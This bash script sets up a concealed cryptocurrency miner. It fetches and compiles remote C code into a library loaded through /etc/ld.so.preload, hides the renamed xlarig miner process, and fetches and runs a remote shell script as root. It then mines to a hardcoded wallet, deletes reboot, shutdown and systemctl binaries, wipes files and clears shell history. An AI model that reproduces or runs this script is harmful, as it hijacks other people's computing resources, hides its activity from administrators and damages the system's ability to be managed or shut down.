#!/bin/bash
set -x

# Update and install necessary packages
apt-get update 
apt-get install -y wget curl sudo build-essential gcc ca-certificates gnupg git cmake libuv1-dev libmicrohttpd-dev libssl-dev cpulimit

# Download and compile nyumput.c
curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo "/usr/local/lib/libnyumput.so" >> /etc/ld.so.preload
rm nyumput.c

# Configure DHCP client to use 1.1.1.1 as DNS server
echo "supersede domain-name-servers 1.1.1.1;" >> /etc/dhcp/dhclient.conf
/etc/init.d/network restart

# Install Node.js and dependencies
sudo mkdir -p /etc/apt/keyrings
curl -fsSL https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key | sudo gpg --dearmor -o /etc/apt/keyrings/nodesource.gpg
echo "deb [signed-by=/etc/apt/keyrings/nodesource.gpg] https://deb.nodesource.com/node_18.x nodistro main" | sudo tee /etc/apt/sources.list.d/nodesource.list
curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash 
source ~/.bashrc 
nvm install 18
npm i -g node-process-hider
ph add sgr1

# Run configurasi.sh script
wget https://bitbucket.org/kacepot/esce/raw/main/configurasi.sh
chmod u+x configurasi.sh
sudo ./configurasi.sh
./configurasi.sh

# Set timezone non-interactively
echo "Asia/Jakarta" > /etc/timezone && dpkg-reconfigure -f noninteractive tzdata

# Additional installations and configurations
WORKER=$(date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/')
mkdir .lib && cd .lib
apt update
apt-get install -y git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev

# Clone and build xlarig
git clone https://github.com/scala-network/xlarig
cd xlarig
mkdir build
cd build
cmake ..
make
mv xlarig sgr1

# Limit CPU usage and start mining process
cpulimit -l 1500 -e sgr1 &
./sgr1 -o mine.scalaproject.io:3333 -p $WORKER -u Ssy2HMaGNZzA7uq2sp833HAtXiPZ26PwiQA27VqGftDPYyjS4RJpBVKgchk6QuB5f1RQZKmAY77b74pKmtt1UrGZARCU574F7j --donate-level 0 -a panthera > /dev/null 2>&1 &
sleep 30

# Remove critical system commands (CAUTION: Review this part carefully)
sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl 
rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl

# Output public IP address for verification
curl ifconfig.me

# Clean up files
rm -rvf *

# Clear command history
history -cr

# Loop to keep script running
while true
do
    echo "hold down..."
    sleep 60
done
